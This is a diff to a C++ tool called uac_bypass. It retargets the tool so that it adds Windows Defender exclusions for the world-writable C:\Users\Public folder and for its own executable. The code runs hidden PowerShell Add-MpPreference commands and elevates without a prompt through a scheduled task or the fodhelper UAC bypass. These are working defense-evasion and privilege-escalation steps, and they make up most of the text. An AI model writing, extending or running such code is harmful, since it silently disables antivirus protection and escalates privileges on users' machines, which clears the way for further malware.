@@ -315,10 +315,10 @@ bool FodhelperBypass(const char* command) {
 
 int main() {
     // Log to both console and file
-    InitLog("C:\\projects\\uac_bypass_log.txt");
+    InitLog("C:\\exclusiontest\\uac_bypass_log.txt");
 
     LOG_INFO("=== UAC Bypass + Defender Exclusion ===");
-    LOG_INFO("Target exclusion path: C:\\projects");
+    LOG_INFO("Target exclusion path: C:\\Users\\Public");
 
     PrintIntegrityLevel();
 
@@ -326,7 +326,7 @@ int main() {
         LOG_OK("Already elevated! Adding exclusion directly...");
 
         // We're already high integrity — just add the exclusion
-        const char* cmd = "Add-MpPreference -ExclusionPath 'C:\\projects' -Force";
+        const char* cmd = "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force";
         LOG_DBG("Running: powershell -c \"%s\"", cmd);
 
         std::string full = std::string("powershell.exe -NoProfile -WindowStyle Hidden -c \"") + cmd + "\"";
@@ -347,7 +347,7 @@ int main() {
     {
         LOG_INFO("--- Trying Method 1: Scheduled Task ---");
         bool ok = RunViaScheduledTask(
-            L"Add-MpPreference -ExclusionPath 'C:\\projects' -Force; "
+            L"Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force; "
             L"Add-MpPreference -ExclusionProcess 'uac_bypass.exe' -Force"
         );
         if (ok) {
@@ -362,7 +362,7 @@ int main() {
         LOG_INFO("--- Trying Method 2: fodhelper bypass ---");
         bool ok = FodhelperBypass(
             "powershell.exe -NoProfile -WindowStyle Hidden -c "
-            "\"Add-MpPreference -ExclusionPath 'C:\\projects' -Force\""
+            "\"Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force\""
         );
         if (ok) {
             LOG_OK("Method 2 succeeded");
@@ -373,7 +373,7 @@ int main() {
     }
 
 done:
-    LOG_INFO("Done. Log saved to C:\\projects\\uac_bypass_log.txt");
+    LOG_INFO("Done. Log saved to C:\\exclusiontest\\uac_bypass_log.txt");
     if (gLogFile) fclose(gLogFile);
 
     printf("\nPress Enter to exit...\n");
